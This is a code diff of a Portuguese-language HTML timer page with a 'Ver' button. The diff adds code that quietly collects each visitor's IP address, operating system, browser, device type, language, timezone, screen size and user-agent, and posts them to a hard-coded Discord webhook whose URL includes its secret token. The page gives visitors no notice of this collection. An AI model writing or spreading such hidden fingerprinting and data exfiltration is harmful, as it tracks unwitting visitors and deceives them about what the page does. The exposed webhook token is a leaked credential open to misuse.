@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 
@@ -94,7 +93,7 @@
 <body>
 
     <div id="verArea">
-        <h1>tempo perdido...</h1>
+        <h1>Ver o tempo decorrido</h1>
         <button onclick="mostrarTemporizador()">Ver</button>
     </div>
 
@@ -142,14 +141,58 @@
                 criarBloco(milissegundos, "Mili/s");
         }
 
+        function detectarSistema() {
+            const ua = navigator.userAgent.toLowerCase();
+
+            if (ua.includes("windows")) return "Windows";
+            if (ua.includes("mac")) return "MacOS";
+            if (ua.includes("android")) return "Android";
+            if (ua.includes("iphone") || ua.includes("ipad")) return "iOS";
+            if (ua.includes("linux")) return "Linux";
+
+            return "Desconhecido";
+        }
+
+        function detectarNavegador() {
+            const ua = navigator.userAgent;
+
+            if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+            if (ua.includes("Edg")) return "Edge";
+            if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+
+            return "Desconhecido";
+        }
+
+        function tipoDispositivo() {
+            return /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+        }
+
         async function enviarWebhook() {
             try {
-                const ipResponse = await fetch("https://api.ipify.org?format=json");
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+                const ipResp = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResp.json();
+
+                const sistema = detectarSistema();
+                const navegador = detectarNavegador();
+                const dispositivo = tipoDispositivo();
+                const idioma = navigator.language || navigator.userLanguage;
+                const fuso = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const largura = screen.width;
+                const altura = screen.height;
+                const ua = navigator.userAgent;
 
                 const payload = {
-                    content: `👁️ Botão "Ver" clicado\n• IP: \`${ip}\``
+                    content: `👁️ Botão "Ver" clicado
+📍 IP: \`${ipData.ip}\`
+💻 Sistema: **${sistema}**
+🧭 Navegador: **${navegador}**
+📱 Dispositivo: **${dispositivo}**
+🌐 Idioma: **${idioma}**
+🕓 Fuso horário: **${fuso}**
+📏 Tela: ${largura}x${altura}
+🧬 User-Agent: \`${ua}\``
                 };
 
                 await fetch("https://discord.com/api/webhooks/1367651528554450944/flFq6ZHJPu8hasSnc10YRJH1BXPHnAtr8hZnUWZlL5-ZZ2vjt8Ynv3MAEgdzOTgl3s1s", {
